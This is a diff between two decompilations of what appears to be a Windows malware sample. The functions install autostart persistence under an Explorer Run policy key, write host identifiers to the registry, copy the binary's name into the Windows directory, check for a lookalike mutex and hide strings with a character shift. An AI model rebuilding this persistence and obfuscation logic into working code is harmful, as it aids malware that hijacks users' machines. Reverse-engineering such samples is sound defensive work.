     int32_t lpFilename; // bp-652
-    int32_t lpReserved2; // 0x401558
+    int32_t lpcbData2;
+    char * lpData2; // bp-744
+    char * lpType;
+    char * lpReserved2; // bp-752
+    char * lpValueName;
+    int32_t hKey2; // bp-760
+    int32_t Reserved; // 0x40153f
     int32_t v7; // 0x40157d
-    int32_t lpData2; // 0x401585
+    int32_t v8; // 0x401583
+    int32_t v9; // 0x40159b
     int32_t result; // 0x4015aa
-    int32_t v8; // 0x4015aa31
-    int32_t v9; // 0x401519
-    int32_t v10; // 0x401592
-    int32_t v11; // 0x401563
+    int32_t v10; // 0x4015aa38
+    int32_t v11; // 0x401592
+    int32_t v12; // 0x401519
+    int32_t v13; // 0x401563
     int32_t str; // 0x4014f7
-    int32_t v12; // 0x401521
-    unsigned char v13; // 0x401503
-    int32_t v14; // 0x401508
-    unsigned char v15; // 0x401519
-    int32_t v16; // 0x401525
-    int32_t time_val; // 0x40156e
-    unsigned char v17; // 0x401521
-    int32_t hKey; // 0x401598
-    int32_t v18; // 0x40151b
-    if (v5 != lpReserved) {
+    int32_t v14; // 0x401521
+    int32_t v15; // 0x401556
+    unsigned char v16; // 0x401503
+    int32_t v17; // 0x401508
+    unsigned char v18; // 0x401519
+    int32_t v19; // 0x401525
+    unsigned char v20; // 0x401521
+    int32_t cbData; // 0x40152c
+    int32_t hKey; // 0x401545
+    int32_t v21; // 0x401598
+    int32_t v22; // 0x40151b
+    if (v4 != hModule) {
         // 0x4014d3
-        GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, (char *)&lpFilename, 512);
+        GetModuleFileNameA((int32_t *)hModule, (char *)&lpFilename, 512);
         str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
-        strcpy((char *)&g35, (char *)str);
-        v13 = *(char *)str;
-        v14 = lpReserved;
-        int32_t v19 = v14;
-        int32_t v20 = v14; // 0x40152f
-        if (v13 != (char)v14) {
+        strcpy((char *)&g37, (char *)str);
+        v16 = *(char *)str;
+        v17 = hModule;
+        int32_t v23 = v17;
+        int32_t v24 = v17; // 0x40152f
+        if (v16 != (char)v17) {
             // 0x40150f
-            v6 = str;
-            int32_t v21 = str; // 0x40151e
-            v9 = g4 & -256 | (int32_t)v13;
-            int32_t v22 = v14;
+            v5 = str;
+            int32_t v25 = str; // 0x40151e
+            v12 = g4 & -256 | (int32_t)v16;
+            int32_t v26 = v17;
             // branch -> 0x401519
             while (true) {
                 // 0x401519
-                v15 = (char)v9 + 1;
-                v18 = v22 + 1;
-                *(char *)(v4 - str + v21) = v15;
-                v12 = v6 + 1;
-                v17 = *(char *)v12;
-                v6 = v12;
-                v16 = lpReserved;
-                if (v17 != (char)v16) {
+                v18 = (char)v12 + 1;
+                v22 = v26 + 1;
+                *(char *)(v3 - str + v25) = v18;
+                v14 = v5 + 1;
+                v20 = *(char *)v14;
+                v5 = v14;
+                v19 = hModule;
+                if (v20 != (char)v19) {
                   lab_0x401519_2:
                     // 0x401519
-                    v21 = v12;
-                    v9 = ((int32_t)v15 | v9 & -256) & -256 | (int32_t)v17;
-                    v22 = v18;
+                    v25 = v14;
+                    v12 = ((int32_t)v18 | v12 & -256) & -256 | (int32_t)v20;
+                    v26 = v22;
                     // branch -> 0x401519
                     continue;
                 } else {
-                    v19 = v18;
-                    v20 = v16;
+                    v23 = v22;
+                    v24 = v19;
                 }
             }
         }
         // 0x401529
-        *(char *)(v19 - 136 + g2) = (char)v20;
-        RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
+        cbData = lpcbData;
+        *(char *)(v23 - 136 + g2) = (char)v24;
+        lpData2 = (char *)&lpData;
+        Reserved = hModule;
+        lpReserved2 = (char *)Reserved;
+        hKey = phkResult;
+        hKey2 = hKey;
+        RegSetValueExA((int32_t *)hKey, "pid", Reserved, 1, (char *)&lpData, cbData);
+        lpcbData2 = cbData;
+        lpType = (char *)1;
+        lpValueName = "pid";
         // branch -> 0x40154e
         // 0x40154e
-        lpReserved2 = lpReserved;
-        v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
-        v8 = 0;
-        if (v11 != 0) {
+        v6 = &g38;
+        v15 = g8;
+        *(int32_t *)(v15 - 4) = v2;
+        *(int32_t *)(v15 - 8) = v6;
+        *(int32_t *)(v15 - 12) = hModule;
+        v1 = (int32_t)"hostid";
+        *(int32_t *)(v15 - 16) = hModule;
+        *(int32_t *)(v15 - 20) = v1;
+        *(int32_t *)(v15 - 24) = phkResult;
+        v13 = RegQueryValueExA((int32_t *)hKey2, lpValueName, (int32_t *)lpReserved2, (int32_t *)lpType, lpData2, (int32_t *)lpcbData2);
+        v10 = 0;
+        if (v13 != 0) {
             // 0x40156d
-            time_val = time((int32_t *)lpReserved);
-            srand(time_val);
+            *(int32_t *)(g8 - 4) = hModule;
+            *(int32_t *)(g8 - 4) = time((int32_t *)hKey2);
+            srand(hKey2);
             v7 = rand();
-            lpData2 = (int32_t)&g36;
-            g36 = (int32_t **)v7;
-            v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
-            v8 = v10;
+            v8 = g8;
+            *(int32_t *)(v8 - 4) = 4;
+            *(int32_t *)(v8 - 8) = v6;
+            *(int32_t *)(v8 - 12) = 4;
+            *(int32_t *)(v8 - 16) = hModule;
+            *(int32_t *)(v8 - 20) = v1;
+            g38 = v7;
+            *(int32_t *)(v8 - 24) = phkResult;
+            v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
+            v10 = v11;
             // branch -> 0x401598
         }
         // 0x401598
-        hKey = phkResult;
-        g5 = v2;
-        g3 = v1;
-        if (hKey != lpReserved) {
+        v21 = phkResult;
+        v9 = g8;
+        g5 = *(int32_t *)v9;
+        if (v21 != hModule) {
             // 0x4015a0
-            result = RegCloseKey((int32_t *)hKey);
+            *(int32_t *)(v9 + 8) = v21;
+            result = RegCloseKey((int32_t *)hKey2);
             // branch -> 0x4015a9
         } else {
-            result = v8;
+            result = v10;
         }
         // 0x4015a9
         return result;
     }
-    char v23 = lpData; // 0x4014ac
-    int32_t v24 = v3;
-    int32_t v25 = lpReserved; // 0x4014cb
-    if (v23 == (char)lpReserved) {
+    int32_t v27 = lpData; // 0x4014ac
+    int32_t v28 = v1;
+    int32_t v29 = hModule; // 0x4014cb
+    char * v30;
+    char * v31;
+    int32_t v32;
+    if ((char)v27 == (char)hModule) {
         // 0x4014c8
-        *(char *)(v24 + (int32_t)&g35) = (char)v25;
-        if (v25 != a1) {
+        *(char *)(v28 + (int32_t)&g37) = (char)v29;
+        if (v29 != a1) {
             // 0x4014c8
             // branch -> 0x4014d3
             // 0x4014d3
-            GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, (char *)&lpFilename, 512);
+            GetModuleFileNameA((int32_t *)hModule, (char *)&lpFilename, 512);
             str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
-            strcpy((char *)&g35, (char *)str);
-            v13 = *(char *)str;
-            v14 = lpReserved;
-            if (v13 != (char)v14) {
+            strcpy((char *)&g37, (char *)str);
+            v16 = *(char *)str;
+            v17 = hModule;
+            if (v16 != (char)v17) {
                 // 0x40150f
-                v9 = g4 & -256 | (int32_t)v13;
+                v12 = g4 & -256 | (int32_t)v16;
                 // branch -> 0x401519
                 while (true) {
                     // 0x401519
-                    v15 = (char)v9 + 1;
-                    v18 = v14 + 1;
-                    *(char *)(v4 - str + str) = v15;
-                    v12 = str + 1;
-                    v17 = *(char *)v12;
-                    v6 = v12;
-                    v16 = lpReserved;
-                    if (v17 != (char)v16) {
+                    v18 = (char)v12 + 1;
+                    v22 = v17 + 1;
+                    *(char *)(v3 - str + str) = v18;
+                    v14 = str + 1;
+                    v20 = *(char *)v14;
+                    v5 = v14;
+                    v19 = hModule;
+                    if (v20 != (char)v19) {
                         goto lab_0x401519_2;
                     }
                     // 0x401529
-                    *(char *)(v18 - 136 + g2) = (char)v16;
-                    RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
+                    cbData = lpcbData;
+                    *(char *)(v22 - 136 + g2) = (char)v19;
+                    lpData2 = (char *)&lpData;
+                    Reserved = hModule;
+                    lpReserved2 = (char *)Reserved;
+                    hKey = phkResult;
+                    hKey2 = hKey;
+                    RegSetValueExA((int32_t *)hKey, "pid", Reserved, 1, (char *)&lpData, cbData);
+                    lpcbData2 = cbData;
+                    lpType = (char *)1;
+                    lpValueName = "pid";
                     // branch -> 0x40154e
                     // 0x40154e
-                    lpReserved2 = lpReserved;
-                    v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
-                    v8 = 0;
-                    if (v11 != 0) {
+                    v6 = &g38;
+                    v15 = g8;
+                    *(int32_t *)(v15 - 4) = v2;
+                    *(int32_t *)(v15 - 8) = v6;
+                    *(int32_t *)(v15 - 12) = hModule;
+                    v1 = (int32_t)"hostid";
+                    *(int32_t *)(v15 - 16) = hModule;
+                    *(int32_t *)(v15 - 20) = v1;
+                    *(int32_t *)(v15 - 24) = phkResult;
+                    v13 = RegQueryValueExA((int32_t *)hKey2, lpValueName, (int32_t *)lpReserved2, (int32_t *)lpType, lpData2, (int32_t *)lpcbData2);
+                    v10 = 0;
+                    if (v13 != 0) {
                         // 0x40156d
-                        time_val = time((int32_t *)lpReserved);
-                        srand(time_val);
+                        *(int32_t *)(g8 - 4) = hModule;
+                        *(int32_t *)(g8 - 4) = time((int32_t *)hKey2);
+                        srand(hKey2);
                         v7 = rand();
-                        lpData2 = (int32_t)&g36;
-                        g36 = (int32_t **)v7;
-                        v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
-                        v8 = v10;
+                        v8 = g8;
+                        *(int32_t *)(v8 - 4) = 4;
+                        *(int32_t *)(v8 - 8) = v6;
+                        *(int32_t *)(v8 - 12) = 4;
+                        *(int32_t *)(v8 - 16) = hModule;
+                        *(int32_t *)(v8 - 20) = v1;
+                        g38 = v7;
+                        *(int32_t *)(v8 - 24) = phkResult;
+                        v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
+                        v10 = v11;
                         // branch -> 0x401598
                     }
                     // 0x401598
-                    hKey = phkResult;
-                    g5 = v2;
-                    g3 = v1;
-                    if (hKey != lpReserved) {
+                    v21 = phkResult;
+                    v9 = g8;
+                    g5 = *(int32_t *)v9;
+                    if (v21 != hModule) {
                         // 0x4015a0
-                        result = RegCloseKey((int32_t *)hKey);
+                        *(int32_t *)(v9 + 8) = v21;
+                        result = RegCloseKey((int32_t *)hKey2);
                         // branch -> 0x4015a9
                     } else {
-                        result = v8;
+                        result = v10;
                     }
                     // 0x4015a9
                     return result;
                 }
             }
             // 0x401529
-            *(char *)(v14 - 136 + g2) = (char)v14;
-            RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
+            cbData = lpcbData;
+            *(char *)(v17 - 136 + g2) = (char)v17;
+            lpData2 = (char *)&lpData;
+            Reserved = hModule;
+            lpReserved2 = (char *)Reserved;
+            hKey = phkResult;
+            hKey2 = hKey;
+            RegSetValueExA((int32_t *)hKey, "pid", Reserved, 1, (char *)&lpData, cbData);
+            lpcbData2 = cbData;
+            lpType = (char *)1;
+            lpValueName = "pid";
             // branch -> 0x40154e
+        } else {
+            lpcbData2 = v32;
+            lpType = v31;
+            lpValueName = v30;
         }
         // 0x40154e
-        lpReserved2 = lpReserved;
-        v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
-        v8 = 0;
-        if (v11 != 0) {
+        v6 = &g38;
+        v15 = g8;
+        *(int32_t *)(v15 - 4) = v2;
+        *(int32_t *)(v15 - 8) = v6;
+        *(int32_t *)(v15 - 12) = hModule;
+        v1 = (int32_t)"hostid";
+        *(int32_t *)(v15 - 16) = hModule;
+        *(int32_t *)(v15 - 20) = v1;
+        *(int32_t *)(v15 - 24) = phkResult;
+        v13 = RegQueryValueExA((int32_t *)hKey2, lpValueName, (int32_t *)lpReserved2, (int32_t *)lpType, lpData2, (int32_t *)lpcbData2);
+        v10 = 0;
+        if (v13 != 0) {
             // 0x40156d
-            time_val = time((int32_t *)lpReserved);
-            srand(time_val);
+            *(int32_t *)(g8 - 4) = hModule;
+            *(int32_t *)(g8 - 4) = time((int32_t *)hKey2);
+            srand(hKey2);
             v7 = rand();
-            lpData2 = (int32_t)&g36;
-            g36 = (int32_t **)v7;
-            v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
-            v8 = v10;
+            v8 = g8;
+            *(int32_t *)(v8 - 4) = 4;
+            *(int32_t *)(v8 - 8) = v6;
+            *(int32_t *)(v8 - 12) = 4;
+            *(int32_t *)(v8 - 16) = hModule;
+            *(int32_t *)(v8 - 20) = v1;
+            g38 = v7;
+            *(int32_t *)(v8 - 24) = phkResult;
+            v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
+            v10 = v11;
             // branch -> 0x401598
         }
         // 0x401598
-        hKey = phkResult;
-        g5 = v2;
-        g3 = v1;
-        if (hKey != lpReserved) {
+        v21 = phkResult;
+        v9 = g8;
+        g5 = *(int32_t *)v9;
+        if (v21 != hModule) {
             // 0x4015a0
-            result = RegCloseKey((int32_t *)hKey);
+            *(int32_t *)(v9 + 8) = v21;
+            result = RegCloseKey((int32_t *)hKey2);
             // branch -> 0x4015a9
         } else {
-            result = v8;
+            result = v10;
         }
         // 0x4015a9
         return result;
     }
-    int32_t v26 = (int32_t)v23 | v5 & -256; // 0x4014b6
-    unsigned char v27 = (char)v26 - 1; // 0x4014b6
-    *(char *)(v24 + (int32_t)&g35) = v27;
-    int32_t v28 = v3; // 0x4014be
-    unsigned char v29 = *(char *)(g2 - 135 + v28); // 0x4014be
-    int32_t v30 = v28 + 1; // 0x4014c5
-    v25 = lpReserved;
-    while (v29 != (char)lpReserved) {
+    int32_t v33 = v27 & 255 | v4 & -256; // 0x4014b6
+    unsigned char v34 = (char)v33 - 1; // 0x4014b6
+    *(char *)(v28 + (int32_t)&g37) = v34;
+    int32_t v35 = v1; // 0x4014be
+    unsigned char v36 = *(char *)(g2 - 135 + v35); // 0x4014be
+    int32_t v37 = v35 + 1; // 0x4014c5
+    int32_t v38 = hModule; // 0x4014b2
+    v29 = v38;
+    while (v36 != (char)v38) {
         // 0x4014b6
-        v26 = ((int32_t)v27 | v26 & -256) & -256 | (int32_t)v29;
-        v27 = (char)v26 - 1;
-        *(char *)(v30 + (int32_t)&g35) = v27;
-        v28 = v30;
-        v29 = *(char *)(g2 - 135 + v28);
-        v30 = v28 + 1;
-        v25 = lpReserved;
+        v33 = ((int32_t)v34 | v33 & -256) & -256 | (int32_t)v36;
+        v34 = (char)v33 - 1;
+        *(char *)(v37 + (int32_t)&g37) = v34;
+        v35 = v37;
+        v36 = *(char *)(g2 - 135 + v35);
+        v37 = v35 + 1;
+        v38 = hModule;
+        v29 = v38;
         // continue -> 0x4014b6
     }
     // 0x4014c8
-    *(char *)(v30 + (int32_t)&g35) = (char)v25;
-    if (v25 != a1) {
+    *(char *)(v37 + (int32_t)&g37) = (char)v29;
+    lpcbData2 = v32;
+    lpType = v31;
+    lpValueName = v30;
+    if (v29 != a1) {
         // 0x4014c8
         // branch -> 0x4014d3
         // 0x4014d3
-        GetModuleFileNameA(&((struct _SECURITY_ATTRIBUTES *)lpReserved)->e0, (char *)&lpFilename, 512);
+        GetModuleFileNameA((int32_t *)hModule, (char *)&lpFilename, 512);
         str = (int32_t)strrchr((char *)&lpFilename, 92) + 1;
-        strcpy((char *)&g35, (char *)str);
-        v13 = *(char *)str;
-        v14 = lpReserved;
-        if (v13 != (char)v14) {
+        strcpy((char *)&g37, (char *)str);
+        v16 = *(char *)str;
+        v17 = hModule;
+        if (v16 != (char)v17) {
             // 0x40150f
-            v9 = g4 & -256 | (int32_t)v13;
+            v12 = g4 & -256 | (int32_t)v16;
             // branch -> 0x401519
             while (true) {
                 // 0x401519
-                v15 = (char)v9 + 1;
-                v18 = v14 + 1;
-                *(char *)(v4 - str + str) = v15;
-                v12 = str + 1;
-                v17 = *(char *)v12;
-                v6 = v12;
-                v16 = lpReserved;
-                if (v17 != (char)v16) {
+                v18 = (char)v12 + 1;
+                v22 = v17 + 1;
+                *(char *)(v3 - str + str) = v18;
+                v14 = str + 1;
+                v20 = *(char *)v14;
+                v5 = v14;
+                v19 = hModule;
+                if (v20 != (char)v19) {
                     goto lab_0x401519_2;
                 }
                 // 0x401529
-                *(char *)(v18 - 136 + g2) = (char)v16;
-                RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
+                cbData = lpcbData;
+                *(char *)(v22 - 136 + g2) = (char)v19;
+                lpData2 = (char *)&lpData;
+                Reserved = hModule;
+                lpReserved2 = (char *)Reserved;
+                hKey = phkResult;
+                hKey2 = hKey;
+                RegSetValueExA((int32_t *)hKey, "pid", Reserved, 1, (char *)&lpData, cbData);
+                lpcbData2 = cbData;
+                lpType = (char *)1;
+                lpValueName = "pid";
                 // branch -> 0x40154e
                 // 0x40154e
-                lpReserved2 = lpReserved;
-                v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
-                v8 = 0;
-                if (v11 != 0) {
+                v6 = &g38;
+                v15 = g8;
+                *(int32_t *)(v15 - 4) = v2;
+                *(int32_t *)(v15 - 8) = v6;
+                *(int32_t *)(v15 - 12) = hModule;
+                v1 = (int32_t)"hostid";
+                *(int32_t *)(v15 - 16) = hModule;
+                *(int32_t *)(v15 - 20) = v1;
+                *(int32_t *)(v15 - 24) = phkResult;
+                v13 = RegQueryValueExA((int32_t *)hKey2, lpValueName, (int32_t *)lpReserved2, (int32_t *)lpType, lpData2, (int32_t *)lpcbData2);
+                v10 = 0;
+                if (v13 != 0) {
                     // 0x40156d
-                    time_val = time((int32_t *)lpReserved);
-                    srand(time_val);
+                    *(int32_t *)(g8 - 4) = hModule;
+                    *(int32_t *)(g8 - 4) = time((int32_t *)hKey2);
+                    srand(hKey2);
                     v7 = rand();
-                    lpData2 = (int32_t)&g36;
-                    g36 = (int32_t **)v7;
-                    v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
-                    v8 = v10;
+                    v8 = g8;
+                    *(int32_t *)(v8 - 4) = 4;
+                    *(int32_t *)(v8 - 8) = v6;
+                    *(int32_t *)(v8 - 12) = 4;
+                    *(int32_t *)(v8 - 16) = hModule;
+                    *(int32_t *)(v8 - 20) = v1;
+                    g38 = v7;
+                    *(int32_t *)(v8 - 24) = phkResult;
+                    v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
+                    v10 = v11;
                     // branch -> 0x401598
                 }
                 // 0x401598
-                hKey = phkResult;
-                g5 = v2;
-                g3 = v1;
-                if (hKey != lpReserved) {
+                v21 = phkResult;
+                v9 = g8;
+                g5 = *(int32_t *)v9;
+                if (v21 != hModule) {
                     // 0x4015a0
-                    result = RegCloseKey((int32_t *)hKey);
+                    *(int32_t *)(v9 + 8) = v21;
+                    result = RegCloseKey((int32_t *)hKey2);
                     // branch -> 0x4015a9
                 } else {
-                    result = v8;
+                    result = v10;
                 }
                 // 0x4015a9
                 return result;
             }
         }
         // 0x401529
-        *(char *)(v14 - 136 + g2) = (char)v14;
-        RegSetValueExA(&((struct timeval *)phkResult)->e0, "pid", lpReserved, 1, &lpData, lpcbData);
+        cbData = lpcbData;
+        *(char *)(v17 - 136 + g2) = (char)v17;
+        lpData2 = (char *)&lpData;
+        Reserved = hModule;
+        lpReserved2 = (char *)Reserved;
+        hKey = phkResult;
+        hKey2 = hKey;
+        RegSetValueExA((int32_t *)hKey, "pid", Reserved, 1, (char *)&lpData, cbData);
+        lpcbData2 = cbData;
+        lpType = (char *)1;
+        lpValueName = "pid";
         // branch -> 0x40154e
     }
     // 0x40154e
-    lpReserved2 = lpReserved;
-    v11 = RegQueryValueExA(&((struct timeval *)phkResult)->e0, "hostid", (int32_t *)lpReserved2, &((struct _SECURITY_ATTRIBUTES *)lpReserved2)->e0, (char *)&g36, &lpcbData);
-    v8 = 0;
-    if (v11 != 0) {
+    v6 = &g38;
+    v15 = g8;
+    *(int32_t *)(v15 - 4) = v2;
+    *(int32_t *)(v15 - 8) = v6;
+    *(int32_t *)(v15 - 12) = hModule;
+    v1 = (int32_t)"hostid";
+    *(int32_t *)(v15 - 16) = hModule;
+    *(int32_t *)(v15 - 20) = v1;
+    *(int32_t *)(v15 - 24) = phkResult;
+    v13 = RegQueryValueExA((int32_t *)hKey2, lpValueName, (int32_t *)lpReserved2, (int32_t *)lpType, lpData2, (int32_t *)lpcbData2);
+    v10 = 0;
+    if (v13 != 0) {
         // 0x40156d
-        time_val = time((int32_t *)lpReserved);
-        srand(time_val);
+        *(int32_t *)(g8 - 4) = hModule;
+        *(int32_t *)(g8 - 4) = time((int32_t *)hKey2);
+        srand(hKey2);
         v7 = rand();
-        lpData2 = (int32_t)&g36;
-        g36 = (int32_t **)v7;
-        v10 = RegSetValueExA(&((struct timeval *)phkResult)->e0, (char *)(int32_t)"hostid", lpReserved, 4, (char *)lpData2, 4);
-        v8 = v10;
+        v8 = g8;
+        *(int32_t *)(v8 - 4) = 4;
+        *(int32_t *)(v8 - 8) = v6;
+        *(int32_t *)(v8 - 12) = 4;
+        *(int32_t *)(v8 - 16) = hModule;
+        *(int32_t *)(v8 - 20) = v1;
+        g38 = v7;
+        *(int32_t *)(v8 - 24) = phkResult;
+        v11 = RegSetValueExA((int32_t *)hKey2, lpValueName, (int32_t)lpReserved2, (int32_t)lpType, lpData2, lpcbData2);
+        v10 = v11;
         // branch -> 0x401598
     }
     // 0x401598
-    hKey = phkResult;
-    g5 = v2;
-    g3 = v1;
-    if (hKey != lpReserved) {
+    v21 = phkResult;
+    v9 = g8;
+    g5 = *(int32_t *)v9;
+    if (v21 != hModule) {
         // 0x4015a0
-        result = RegCloseKey((int32_t *)hKey);
+        *(int32_t *)(v9 + 8) = v21;
+        result = RegCloseKey((int32_t *)hKey2);
         // branch -> 0x4015a9
     } else {
-        result = v8;
+        result = v10;
     }
     // 0x4015a9
     return result;
 }
 
-// Address range: 0x4015ab - 0x4015d3
+// Address range: 0x4015ab - 0x4015d4
 int32_t function_4015ab(void) {
     int32_t v1 = 0; // bp-8
-    int32_t result = function_405908((int32_t *)-0x7ffffffe, (int32_t)"OUOPAIX?qnnajp?kjpnkhOapX?kjpnkhXHo]", (int32_t)"bkn_acqaop", 4, (int32_t)&v1, 4, 0); // 0x4015ca
+    int32_t result = function_405908((int32_t *)-0x7ffffffe, (int32_t)"OUOPAIX?qnnajp?kjpnkhOapX?kjpnkhXHo]", (int32_t)"bkn_acqaop", 4, (int32_t)&v1, 4); // 0x4015ca
     return result;
 }
 
-// Address range: 0x4015d4 - 0x4016a3
-int32_t function_4015d4(int32_t lpValueName, int32_t a2) {
-    int32_t ** v1 = (int32_t **)g6; // bp-524
+// Address range: 0x4015d4 - 0x4016a4
+int32_t function_4015d4(char * lpValueName, int32_t a2) {
     int32_t lpBuffer = 0; // bp-520
     GetWindowsDirectoryA((char *)&lpBuffer, 512);
     int32_t str = 0; // bp-517
     strcpy((char *)&str, (char *)&g11);
     strcat((char *)&lpBuffer, (char *)&g12);
     strcat((char *)&lpBuffer, g13);
-    strcat((char *)&lpBuffer, (char *)&g48);
+    strcat((char *)&lpBuffer, (char *)&g50);
     int32_t Reserved = 0; // esi
-    int32_t ** phkResult = NULL; // bp-8
-    RegCreateKeyExA(HKEY_CURRENT_USER, "Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoekjXLkhe_eaoXAtlhknanXNqj", 0, (char *)&g68, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
-    int32_t v2;
+    int32_t phkResult = 0; // bp-8
+    RegCreateKeyExA(HKEY_CURRENT_USER, "Okbps]naXIe_nkokbpXSej`ksoX?qnnajpRanoekjXLkhe_eaoXAtlhknanXNqj", 0, (char *)&g74, 0, 0x2001f, NULL, (int32_t **)&phkResult, NULL);
+    char * hKey2; // bp-576
+    int32_t v1;
     if (a2 != 1) {
-        int32_t hKey = *(int32_t *)&phkResult; // 0x40168a12
-        v2 = RegDeleteValueA((int32_t *)hKey, (char *)lpValueName);
+        int32_t hKey = phkResult; // 0x40168a
+        hKey2 = (char *)hKey;
+        v1 = RegDeleteValueA((int32_t *)hKey, (char *)*(int32_t *)&lpValueName);
         // branch -> 0x401693
     } else {
         int32_t len = strlen((char *)&lpBuffer); // 0x401668
         g4 = &lpBuffer;
-        int32_t v3 = RegSetValueExA((int32_t *)phkResult, (char *)lpValueName, Reserved, 1, (char *)&lpBuffer, len); // 0x40167f
-        v2 = v3;
+        hKey2 = (char *)&lpBuffer;
+        int32_t lpValueName2 = *(int32_t *)&lpValueName; // 0x4016796
+        int32_t v2 = RegSetValueExA((int32_t *)phkResult, (char *)lpValueName2, Reserved, 1, (char *)&lpBuffer, len); // 0x40167f
+        v1 = v2;
         // branch -> 0x401693
     }
-    int32_t ** hKey2 = phkResult; // 0x401693
-    int32_t v4 = (int32_t)hKey2; // 0x401693
-    g6 = (int32_t)v1;
+    int32_t v3 = phkResult; // 0x401693
+    int32_t * v4 = (int32_t *)g8; // 0x401696
+    g7 = *v4;
     int32_t result; // 0x4016a3
-    if (v4 != Reserved) {
+    if (v3 != Reserved) {
         // 0x401699
-        *(int32_t *)&v1 = v4;
+        *v4 = v3;
         result = RegCloseKey((int32_t *)hKey2);
         // branch -> 0x4016a2
     } else {
-        result = v2;
+        result = v1;
     }
     // 0x4016a2
     return result;
 }
 
-// Address range: 0x4016a4 - 0x4018c0
+// Address range: 0x4016a4 - 0x4018c1
 int32_t function_4016a4(void) {
-    int32_t v1 = g3; // 0x4016ad
-    int32_t v2 = g6; // 0x4016ae
-    g6 = (int32_t)"Ie_nkokbpVf";
+    // 0x4016a4
+    int32_t v1; // bp-1540
+    int32_t v2 = &v1; // 0x4016a7
+    g7 = (int32_t)"Ie_nkokbpVf";
     g3 = 0;
     int32_t * hObject = OpenMutexA(0x1f0001, false, "Ie_nkokbpVf"); // 0x4016bd
-    int32_t lpMutexAttributes2 = g3; // 0x4016c3
-    char * lpBuffer2;
-    int32_t str; // bp-513
-    int32_t lpBuffer; // bp-516
-    if ((int32_t)hObject != lpMutexAttributes2) {
-        int32_t v3 = g5; // 0x4016d5
+    int32_t lpMutexAttributes = g3; // 0x4016c3
+    struct _SECURITY_ATTRIBUTES * lpName;
+    struct _SECURITY_ATTRIBUTES * dwMilliseconds; // bp-1584
+    struct _SECURITY_ATTRIBUTES * dwMilliseconds2; // bp-1588
+    int32_t v3; // bp-513
+    int32_t v4; // bp-516
+    struct _SECURITY_ATTRIBUTES * v5;
+    int32_t v6; // 0x4017bf
+    int32_t v7; // 0x401736
+    if ((int32_t)hObject != lpMutexAttributes) {
+        // 0x4016d5
         CloseHandle(hObject);
-        g5 = (int32_t)&g35;
-        if (lstrcmpiA((char *)&g35, "EATLHKNA*ATA") == 0) {
+        g5 = (int32_t)&g37;
+        int32_t v8 = lstrcmpiA((char *)&g37, "EATLHKNA*ATA"); // 0x4016e8
+        lpName = v5;
+        if (v8 == 0) {
             // 0x4016f2
-            if (lstrcmpiA((char *)&g48, "EATLHKNA*ATA") != 0) {
+            dwMilliseconds = (struct _SECURITY_ATTRIBUTES *)&g50;
+            if (lstrcmpiA((char *)&g50, "EATLHKNA*ATA") != 0) {
                 // 0x401706
                 ExitProcess(1);
                 // UNREACHABLE
             }
+            lpName = (struct _SECURITY_ATTRIBUTES *)"EATLHKNA*ATA";
         }
         // 0x40170e
-        SetEvent(&((struct _SECURITY_ATTRIBUTES *)g22)->e0);
-        WaitForSingleObject(&((struct _SECURITY_ATTRIBUTES *)g21)->e0, 0x1388);
-        Sleep(500);
-        lpBuffer = 0;
-        GetWindowsDirectoryA((char *)&lpBuffer, 512);
-        str = 0;
-        strcpy((char *)&str, (char *)&g11);
-        strcat((char *)&lpBuffer, (char *)&g12);
-        strcat((char *)&lpBuffer, g13);
-        strcat((char *)&lpBuffer, (char *)g5);
-        SetFileAttributesA((char *)&lpBuffer, g3);
-        DeleteFileA((char *)&lpBuffer);
-        function_4015d4(g5, g3);
-        int32_t lpMutexAttributes = g3; // 0x4017b0
-        CreateMutexA((struct _SECURITY_ATTRIBUTES *)lpMutexAttributes, (lpMutexAttributes & 1) != 0, (char *)g6);
-        g5 = (int32_t)(struct _SECURITY_ATTRIBUTES *)v3;
-        lpBuffer2 = (char *)&lpBuffer;
+        *(int32_t *)(g8 - 4) = g24;
+        SetEvent(&dwMilliseconds2->e0);
+        *(int32_t *)(g8 - 4) = 0x1388;
+        *(int32_t *)(g8 - 8) = g23;
